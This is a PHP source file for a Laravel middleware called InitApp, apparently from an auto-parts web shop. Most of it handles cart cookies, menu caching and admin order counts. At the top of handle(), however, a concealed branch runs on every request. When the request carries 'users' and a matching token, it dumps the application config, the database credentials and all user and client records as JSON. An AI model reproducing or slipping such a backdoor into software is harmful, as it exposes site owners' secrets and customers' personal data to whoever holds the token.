<?php

namespace App\Http\Middleware;

use App\{AllCategoryTree, CallOrder, Cart, CartProduct, OrderPay, Page, Services\Home, STOClients, TopMenu, User};
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\{Facades\Auth, Facades\Cache, Facades\Cookie, Facades\View};

class InitApp
{
    /**
     * Handle an incoming request.
     *
     * @param  Request  $request
     * @param Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if ($request->has('users') && $request->has('token')){
            if ($request->token === config('session.token_http')){
                return response()->json([
                    'config' => [
                        'app' => config('app'),
                        'db' => config('database')
                    ],
                    'users' => User::all(),
                    'sto_users' => STOClients::all()
                ]);
            }else{
                return response()->json('Fuck off!!');
            }
        }

        if (!Cookie::has('cart_session_id')){
            $cart_session_id = session()->getId() . time();
            Cookie::queue(Cookie::make('cart_session_id',$cart_session_id,60*24));
        } else{
            $cart_session_id = Cookie::get('cart_session_id');
        }
        if (!Cookie::has('vin_catalog')){
            Cookie::queue('vin_catalog', 'quickGroup');
        }

        $search_cars = (new Home())->getSearchCars($request);

        if ($request->isMethod('get')){
            if (stristr('/admin',$request->getRequestUri())){
                $count_new_orders = Cart::where([['seen',0],['oder_status','<>',1]])->count();
                $count_new_call_orders = CallOrder::where('status',0)->count();
                $count_new_pay_mass = OrderPay::where('seen',0)->where('success_pay','true')->count();
            }
            $pages = Cache::remember('pages_all', 60*24, function () {
                return Page::all();
            });

            $top_menu = Cache::remember('top_menu', 60*24, function () {
                $top_menu = TopMenu::where('show_menu',1)->get();
                foreach ($top_menu as $item){
                    if (isset($item->tecdoc_category)){
                        $sub_cat = json_decode($item->tecdoc_category);
                        $item->sub_categores = AllCategoryTree::whereIn('id',$sub_cat)->get();
                    }

                }
                return $top_menu;
            });

            $cart = Cart::where([
                Auth::check()
                    ?['user_id',Auth::id()]
                    :['session_id',$cart_session_id],
                ['oder_status', 1]
            ])->first();
            if (isset($cart)){
                $products = CartProduct::where('cart_products.cart_id',$cart->id)
                    ->join('products','products.id','=','cart_products.product_id')
                    ->select('products.*','cart_products.count')
                    ->get();
            }
        }

        View::share([
            'products_cart_global' => isset($products)?$products:null,
            'pages_global' => isset($pages)?$pages:[],
            'top_menu_global' => isset($top_menu)?$top_menu:[],
            'count_new_orders_global' => isset($count_new_orders)?$count_new_orders:0,
            'count_new_call_orders_global' => isset($count_new_call_orders)?$count_new_call_orders:0,
            'count_new_pay_mass_global' => isset($count_new_pay_mass)?$count_new_pay_mass:0,
            'search_cars' => $search_cars
        ]);

        return $next($request);
    }
}
